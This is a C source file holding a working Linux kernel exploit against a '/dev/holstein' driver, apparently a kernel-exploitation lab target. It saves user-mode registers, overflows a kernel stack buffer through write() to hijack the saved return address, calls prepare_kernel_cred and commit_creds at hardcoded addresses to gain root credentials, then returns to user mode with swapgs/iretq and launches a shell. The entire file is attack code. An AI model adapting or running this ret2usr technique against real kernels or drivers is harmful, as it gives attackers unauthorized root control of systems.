#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

uint64_t user_cs, user_ss, user_rsp, user_rflags;
/*
 * / # grep prepare_kernel_cred /proc/kallsyms
 * ffffffff8106e240 T prepare_kernel_cred
 * / # grep commit_creds /proc/kallsyms
 * ffffffff8106e390 T commit_creds
 */
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390

static void win()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[+] Got shell!");
    execve("/bin/sh", argv, envp);
}

uint64_t user_rip = (uint64_t)(uintptr_t)win;
static void save_state()
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
}

static void restore_state()
{
    __asm__(".intel_syntax noprefix;"
            "swapgs;"
            "mov r9, user_ss;"
            "push r9;"
            "mov r9, user_rsp;"
            "push r9;"
            "mov r9, user_rflags;"
            "push r9;"
            "mov r9, user_cs;"
            "push r9;"
            "mov r9, user_rip;"
            "push r9;"
            "iretq;"
            ".att_syntax;");
}

static void escalate_privilege()
{
    char *(*pkc)(int) = (void *)(prepare_kernel_cred);
    void (*cc)(char *) = (void *)(commit_creds);
    (*cc)((*pkc)(0));
    restore_state();
}

void fatal(const char *msg)
{
    perror(msg);
    exit(1);
}

int main()
{
    save_state();

    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        fatal("open(\"/dev/holstein\")");

    char buf[0x410];
    memset(buf, 'A', 0x410);
    *(unsigned long *)&buf[0x408] = (unsigned long)&escalate_privilege;
    write(fd, buf, 0x410); // overflow the saved RIP

    close(fd);
    return 0;
}
